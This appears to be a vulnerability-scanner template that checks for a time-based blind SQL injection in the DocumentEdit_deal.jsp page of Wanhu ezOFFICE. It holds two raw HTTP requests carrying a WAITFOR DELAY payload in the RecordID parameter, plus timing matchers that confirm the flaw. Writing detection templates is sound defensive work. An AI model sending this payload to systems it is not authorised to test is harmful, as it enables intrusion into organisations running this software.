id: poc-yaml-wanhu-ezoffice-documentedit-deal-sqli
info:
  name: "万户 ezOFFICE DocumentEdit_deal.jsp SQL 注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: 万户ezOFFICE

http:
  - raw:
      - |
        GET /defaultroot/public/iWebOfficeSign/DocumentEdit_deal.jsp?RecordID=1%27%20WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
      - |
        GET /defaultroot/public/iWebOfficeSign/DocumentEdit_deal.jsp?RecordID=1%27%20WAITFOR%20DELAY%20%270:0:8%27-- HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "rootPath"
          - "saveHTML"
        part: body
      - type: dsl
        dsl:
          - "status_code == 200"
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
